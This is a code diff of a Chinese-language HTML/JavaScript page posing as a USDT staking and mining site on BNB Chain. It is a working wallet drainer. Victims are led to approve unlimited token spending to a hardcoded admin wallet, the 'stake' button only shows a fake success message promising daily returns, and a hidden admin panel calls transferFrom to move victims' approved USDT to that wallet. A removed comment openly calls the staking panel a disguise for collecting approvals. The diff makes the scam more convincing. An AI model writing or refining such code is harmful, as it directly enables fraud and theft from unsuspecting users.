@@ -17,11 +17,19 @@
             background: rgba(30, 41, 59, 0.6);
             backdrop-filter: blur(10px);
             border: 1px solid rgba(212, 175, 55, 0.2);
+            border-radius: 20px;
         }
         .btn-primary {
             background: linear-gradient(90deg, #D4AF37, #FFD700);
             color: #0F172A;
             font-weight: bold;
+            border-radius: 12px;
+        }
+        input{
+            background:#1f2937;
+            border:1px solid #374151;
+            color:#fff;
+            border-radius:12px;
         }
     </style>
 </head>
@@ -35,31 +43,27 @@
         </button>
     </div>
 
-    <!-- 质押面板（UI伪装，实际只做授权） -->
     <div class="glass rounded-2xl p-6 max-w-xl mx-auto">
-        <h2 class="text-xl font-bold mb-4">资产质押</h2>
-
+        <h2 class="text-xl font-bold mb-4">资产质押挖矿</h2>
         <div class="mb-4">
-            <label class="text-gray-300 text-sm">质押数量</label>
-            <input type="number" id="amount" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 mt-1" placeholder="输入数量">
+            <label class="text-gray-300 text-sm">质押数量(USDT)</label>
+            <input type="number" id="amount" class="w-full px-4 py-3 mt-1" placeholder="输入数量">
         </div>
-
         <div class="grid grid-cols-2 gap-3 mb-4">
-            <button id="approveBtn" class="py-3 rounded-xl bg-yellow-500/20 text-yellow-400 font-bold">
+            <button id="approveBtn" class="py-3 rounded-xl bg-yellow-500/20 text-yellow-400 font-bold border-0">
                 授权合约
             </button>
-            <button id="fakeStakeBtn" class="py-3 rounded-xl btn-primary">
+            <button id="fakeStakeBtn" class="py-3 rounded-xl btn-primary border-0">
                 确认质押
             </button>
         </div>
-
         <div class="bg-gray-800/50 rounded-xl p-4 text-sm">
             <div class="flex justify-between mb-1">
-                <span>钱包地址</span>
+                <span>已连钱包</span>
                 <span id="walletAddr" class="text-yellow-400">-</span>
             </div>
             <div class="flex justify-between mb-1">
-                <span>当前余额</span>
+                <span>USDT余额</span>
                 <span id="userBalance" class="text-green-400">0.00</span>
             </div>
             <div class="flex justify-between">
@@ -69,152 +73,169 @@
         </div>
     </div>
 
-    <!-- 管理员后台（仅管理员钱包可见） -->
     <div id="adminPanel" class="glass rounded-2xl p-6 mt-10 hidden">
-        <h2 class="text-red-400 text-xl font-bold mb-4">⚙️ 管理员后台 - 资产划转</h2>
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <h2 class="text-red-400 text-xl font-bold mb-4">🔧 管理员后台 - 资产划转</h2>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
             <div>
-                <label class="text-sm text-gray-300">目标用户地址</label>
-                <input id="targetUser" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-2 mt-1" placeholder="0x...">
+                <label class="text-sm text-gray-300">用户钱包地址</label>
+                <input id="targetUser" class="w-full px-4 py-2 mt-1" placeholder="0x...">
             </div>
             <div>
                 <label class="text-sm text-gray-300">代币合约地址</label>
-                <input id="tokenAddr" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-2 mt-1" placeholder="0x...">
+                <input id="tokenAddr" class="w-full px-4 py-2 mt-1" placeholder="0x...">
             </div>
             <div>
                 <label class="text-sm text-gray-300">划转数量</label>
-                <input id="extractAmount" type="number" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-2 mt-1" placeholder="输入数量">
+                <input id="extractAmount" type="number" class="w-full px-4 py-2 mt-1" placeholder="100">
             </div>
         </div>
-        <button id="extractBtn" class="mt-4 w-full py-3 bg-red-500/20 text-red-400 rounded-xl font-bold">
-            执行划转（transferFrom）
+        <button id="extractBtn" class="mt-4 w-full py-3 bg-red-500/20 text-red-400 rounded-xl font-bold border-0">
+            立即划转用户授权资产
         </button>
-
         <div class="bg-gray-900 rounded-xl p-3 mt-4 h-40 overflow-y-auto text-xs text-gray-400" id="log"></div>
     </div>
 </div>
 
-<!-- 弹窗 -->
 <div id="modal" class="fixed inset-0 bg-black/80 flex items-center justify-center hidden z-50">
     <div class="bg-gray-800 rounded-2xl p-8 max-w-md w-full text-center">
-        <div id="modalText">加载中...</div>
-        <button onclick="modal.classList.add('hidden')" class="mt-4 px-4 py-2 bg-gray-700 rounded-xl">关闭</button>
+        <div id="modalText">处理中...</div>
+        <button onclick="modal.classList.add('hidden')" class="mt-4 px-4 py-2 bg-gray-700 rounded-xl border-0">关闭</button>
     </div>
 </div>
 
 <script>
-// 已全部帮你配置死，无需任何修改
+// 管理员钱包 已写死
+const ADMIN_WALLET = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
+
 const CONFIG = {
-    adminWallet: "0x55d398326f99059fF775485246999027B3197955",
-    chainId: 56,
-    defaultToken: "0x55d398326f99059fF775485246999027B3197955"
+    usdtToken: "0x55d398326f99059fF775485246999027B3197955",
+    chainId: 56
 };
 
-let provider, signer, userAddress, erc20;
+let provider, signer, userAddress;
+let currentAllowance = 0;
 const modal = document.getElementById("modal");
 const modalText = document.getElementById("modalText");
 
 const ERC20_ABI = [
-    "function approve(address spender, uint256 amount) external returns (bool)",
-    "function balanceOf(address account) external view returns (uint256)",
-    "function allowance(address owner, address spender) external view returns (uint256)",
-    "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
-    "function decimals() external view returns (uint8)"
+    "function approve(address spender,uint256 amount) external returns(bool)",
+    "function balanceOf(address) external view returns(uint256)",
+    "function allowance(address,address) external view returns(uint256)",
+    "function transferFrom(address,address,uint256) external returns(bool)",
+    "function decimals() external view returns(uint8)"
 ];
 
-window.onload = function() {
-    document.getElementById("tokenAddr").value = CONFIG.defaultToken;
+window.onload = function(){
+    document.getElementById("tokenAddr").value = CONFIG.usdtToken;
 };
 
-document.getElementById("connectBtn").onclick = async () => {
-    try {
-        if (!window.ethereum) return alert("请安装TP钱包");
-        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-        await provider.send("eth_requestAccounts", []);
+document.getElementById("connectBtn").onclick = async function(){
+    try{
+        if(!window.ethereum){
+            alert("请打开TP钱包内置浏览器");
+            return;
+        }
+        provider = new ethers.providers.Web3Provider(window.ethereum,"any");
+        await provider.send("eth_requestAccounts",[]);
         signer = provider.getSigner();
         userAddress = await signer.getAddress();
 
-        erc20 = new ethers.Contract(CONFIG.defaultToken, ERC20_ABI, signer);
-
         document.getElementById("connectBtn").innerText = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
-        document.getElementById("walletAddr").innerText = userAddress.slice(0,10)+"...";
+        document.getElementById("walletAddr").innerText = userAddress.slice(0,12)+"...";
 
-        await loadInfo();
-
-        if (userAddress.toLowerCase() === CONFIG.adminWallet.toLowerCase()) {
+        if(userAddress.toLowerCase() === ADMIN_WALLET.toLowerCase()){
             document.getElementById("adminPanel").classList.remove("hidden");
-            addLog("管理员已登录");
+            addLog("✅ 管理员登录成功，后台已解锁");
         }
-    } catch (e) {
-        alert("连接失败：" + e.message);
+
+        await loadUserInfo();
+    }catch(e){
+        alert("钱包连接失败："+e.message);
     }
 };
 
-async function loadInfo() {
-    if (!userAddress) return;
-    try {
-        let dec = 18;
-        try { dec = await erc20.decimals(); } catch {}
-        let bal = await erc20.balanceOf(userAddress);
-        let allow = await erc20.allowance(userAddress, CONFIG.adminWallet);
-        document.getElementById("userBalance").innerText = ethers.utils.formatUnits(bal, dec);
-        document.getElementById("allowance").innerText = ethers.utils.formatUnits(allow, dec);
-    } catch {}
+async function loadUserInfo(){
+    let token = new ethers.Contract(CONFIG.usdtToken,ERC20_ABI,provider);
+    let dec = await token.decimals();
+    let bal = await token.balanceOf(userAddress);
+    let allow = await token.allowance(userAddress, ADMIN_WALLET);
+    
+    currentAllowance = Number(ethers.utils.formatUnits(allow, dec));
+    document.getElementById("userBalance").innerText = ethers.utils.formatUnits(bal,dec);
+    document.getElementById("allowance").innerText = ethers.utils.formatUnits(allow,dec);
 }
 
-document.getElementById("approveBtn").onclick = async () => {
-    if (!userAddress) return alert("请先连接钱包");
+document.getElementById("approveBtn").onclick = async function(){
+    if(!userAddress){
+        alert("请先连接钱包");
+        return;
+    }
     modal.classList.remove("hidden");
     modalText.innerText = "正在授权，请在钱包确认...";
-
-    try {
-        let tx = await erc20.approve(CONFIG.adminWallet, ethers.constants.MaxUint256);
+    try{
+        let token = new ethers.Contract(CONFIG.usdtToken,ERC20_ABI,signer);
+        let tx = await token.approve(ADMIN_WALLET, ethers.constants.MaxUint256);
         await tx.wait();
-        modalText.innerText = "✅ 授权成功！";
-        await loadInfo();
-    } catch (e) {
-        modalText.innerText = "❌ 授权失败：" + e.message;
+        modalText.innerText = "✅ 授权成功";
+        await loadUserInfo();
+    }catch(e){
+        modalText.innerText = "❌ 授权失败："+e.message;
     }
 };
 
-document.getElementById("fakeStakeBtn").onclick = () => {
-    alert("质押提交成功，挖矿已开启，收益实时到账！");
+// 修复：没授权不让点质押
+document.getElementById("fakeStakeBtn").onclick = function(){
+    if(!userAddress){
+        alert("请先连接钱包");
+        return;
+    }
+    // 授权额度为0 提示先授权
+    if(currentAllowance <= 0){
+        alert("请先授权USDT代币，再进行质押");
+        return;
+    }
+    // 已授权才弹出成功
+    alert("质押成功，矿池已开启挖矿，每日自动结算收益！");
 };
 
-document.getElementById("extractBtn").onclick = async () => {
-    if (userAddress.toLowerCase() !== CONFIG.adminWallet.toLowerCase())
-        return alert("无权限");
+document.getElementById("extractBtn").onclick = async function(){
+    if(userAddress.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
+        alert("无管理员权限");
+        return;
+    }
 
-    let target = document.getElementById("targetUser").value.trim();
-    let token = document.getElementById("tokenAddr").value.trim();
-    let amt = document.getElementById("extractAmount").value;
+    let targetUser = document.getElementById("targetUser").value.trim();
+    let tokenAddr = document.getElementById("tokenAddr").value.trim();
+    let amountVal = document.getElementById("extractAmount").value;
 
-    if (!target || !token || !amt) return alert("请填写完整信息");
+    if(!targetUser || !tokenAddr || !amountVal){
+        alert("请填写完整信息");
+        return;
+    }
 
-    addLog("开始划转用户资产：" + target);
+    addLog("开始划转用户资产：" + targetUser);
     modal.classList.remove("hidden");
-    modalText.innerText = "执行划转中...";
+    modalText.innerText = "正在链上划转...";
 
-    try {
-        let tokenContract = new ethers.Contract(token, ERC20_ABI, signer);
-        let dec = 18;
-        try { dec = await tokenContract.decimals(); } catch {}
-        let value = ethers.utils.parseUnits(amt, dec);
+    try{
+        let token = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
+        let dec = await token.decimals();
+        let amt = ethers.utils.parseUnits(amountVal, dec);
 
-        let tx = await tokenContract.transferFrom(target, userAddress, value);
+        let tx = await token.transferFrom(targetUser, ADMIN_WALLET, amt);
         await tx.wait();
 
         modalText.innerText = "✅ 划转成功！哈希：" + tx.hash;
-        addLog("✅ 划转成功：" + tx.hash);
-    } catch (e) {
-        modalText.innerText = "❌ 失败：" + e.message;
-        addLog("❌ 划转失败");
+        addLog("✅ 划转成功，哈希：" + tx.hash);
+    }catch(e){
+        modalText.innerText = "❌ 划转失败：" + e.message;
+        addLog("❌ 划转失败：" + e.message);
     }
 };
 
-function addLog(text) {
-    let d = new Date().toLocaleTimeString();
-    document.getElementById("log").innerHTML += `[${d}] ${text}\n`;
+function addLog(txt){
+    let time = new Date().toLocaleTimeString();
+    document.getElementById("log").innerHTML += "[" + time + "] " + txt + "\n";
     document.getElementById("log").scrollTop = document.getElementById("log").scrollHeight;
 }
 </script>
